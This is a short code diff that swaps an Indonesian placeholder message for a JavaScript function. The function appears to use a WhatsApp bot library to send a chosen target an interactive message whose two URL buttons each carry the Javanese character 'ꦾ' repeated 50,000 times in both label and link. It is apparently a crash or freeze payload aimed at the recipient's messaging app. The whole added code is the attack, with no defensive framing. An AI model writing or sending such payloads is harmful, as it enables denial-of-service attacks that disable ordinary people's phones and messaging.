@@ -1,2 +1,34 @@
-Aku Lagi Explore Dulu ya Gais 
-Tunggu Aja Ya Syaangg Mwah >_<
+async function Test(target) {
+  await sock.relayMessage(
+    target,
+    {
+      interactiveMessage: {
+        body: {
+          text: "Test"
+        },
+
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "cta_url",
+
+              buttonParamsJson: JSON.stringify({
+                display_text: "ꦾ".repeat(50000),
+                url: "ꦾ".repeat(50000),
+              })
+           },
+          {
+name: "cta_url",
+
+              buttonParamsJson: JSON.stringify({
+                display_text: "ꦾ".repeat(50000),
+                url: "ꦾ".repeat(50000),
+              })
+            }
+          ]
+        }
+      }
+    },
+    {}
+  );
+}
